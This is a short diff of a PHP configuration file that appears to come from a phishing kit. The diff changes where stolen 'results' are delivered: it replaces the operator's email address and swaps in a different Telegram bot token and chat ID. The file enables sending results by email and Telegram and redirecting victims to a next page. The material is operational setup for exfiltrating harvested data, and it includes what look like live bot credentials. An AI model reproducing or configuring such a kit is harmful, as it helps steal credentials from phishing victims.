@@ -1,6 +1,6 @@
 <?php
 
-$Z118_EMAIL = "freshkvng5938@yahoo.com";  /* PUT YOUR FUCKING EMAIL HERE BRO */
+$Z118_EMAIL = "ericjohn190@yahoo.com";  /* PUT YOUR FUCKING EMAIL HERE BRO */
 
 
 /* OPTIONS TO SAVE AND SEND YOUR RESULTS */
@@ -13,8 +13,8 @@ $send_results_to_email = "on";
 
 
 /* TELEGRAM BOT INFORMATION */
-$bot_token = "5260137707:AAGjzHDlhOzsg7kc9UXIGA1eJSEJIw6onfg"; /* bot token */
-$chat_id = "-1001691818618";
+$bot_token = "5519317788:AAE2QUA9QsWqyhN58i51JFh099m1eyEdRyw"; /* bot token */
+$chat_id = "-1001790388493";
 
 /* DO NOT TOUCH */
 $redirect_to_next_page = "on";
